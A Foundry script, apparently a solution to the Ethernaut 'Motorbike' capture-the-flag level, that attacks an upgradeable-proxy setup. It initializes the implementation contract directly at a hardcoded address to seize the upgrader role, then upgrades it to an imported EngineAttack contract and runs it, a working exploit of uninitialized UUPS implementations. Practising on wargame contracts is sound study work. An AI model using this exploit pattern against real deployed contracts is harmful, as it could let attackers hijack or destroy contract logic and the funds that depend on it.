// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

pragma experimental ABIEncoderV2;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import {Motorbike, Engine, EngineAttack} from "../src/Motorbike.sol";

contract MotorbikeScript is Script {
    function run() public {
        Motorbike motor = Motorbike(0x43D480f9A4e9ad79d8F130212766e896D9554aa0);
        Engine engine = Engine(0x19A6452406F5934a919feB306197D71e4BCBEc15);

        vm.startBroadcast();
        EngineAttack attack = new EngineAttack();
        engine.initialize();
        engine.upgradeToAndCall(address(attack), abi.encodeWithSelector(EngineAttack.run.selector));
        vm.stopBroadcast();

        console.log("engine upgrader %s", engine.upgrader());
    }
}